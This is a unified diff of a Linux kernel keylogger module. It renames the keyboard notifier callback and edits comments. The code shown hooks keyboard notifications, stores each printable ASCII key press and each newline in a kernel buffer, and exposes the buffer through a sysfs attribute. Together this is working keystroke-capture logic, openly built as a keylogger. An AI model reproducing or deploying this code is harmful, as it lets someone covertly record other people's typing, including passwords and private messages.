@@ -19,7 +19,7 @@ static struct kobject *keyLog_obj;
 // Prototypes
 void keylog_exit(void);
 static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf); 
-static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
+static int keyboard_keys_handle(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
 
 /*like read function return length of buffer. */
 static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
@@ -32,22 +32,20 @@ static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,cha
 	return len;
 	
 }
-static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
+static int keyboard_keys_handle(struct notifier_block *nb, unsigned long action, void *data) {
 	
 	struct keyboard_notifier_param *param = data;
 	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
 	if (action == KBD_KEYSYM && param->down) {
 		char c = param->value;
 		
-		// We will only log those key presses that actually represent an ASCII character. 
-		if (c == 0x01) {
+		if (c == 0x01) { //Taking only ASCII characters ignoring the rest.
 			*(keys_bf_ptr++) = 0x0a;
 			buf_pos++;
 		} else if (c >= 0x20 && c < 0x7f) {
 			*(keys_bf_ptr++) = c;
 			buf_pos++;
 		}
-		// Beware of buffer overflows in kernel space!! They can be catastrophic!
 		//Prevents the OS to cracked in event of OVERFLOW
 		if (buf_pos >= BUFFER_LEN) {
 			buf_pos = 0;
@@ -55,7 +53,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 			keys_bf_ptr = keys_buffer;
 		}
 	}
-		return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
+		return NOTIFY_OK; //  "Notification was processed correctly" with the value 0x0001
 }
 
 /*Initializing the notifier_block
@@ -64,7 +62,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
  * The functions are registered to this notification list.
  * */
 static struct notifier_block nb = {
-	.notifier_call = keys_pressed
+	.notifier_call = keyboard_keys_handle
 }; 
 
 /*initialize the struct kobject_attribute (By value)*/
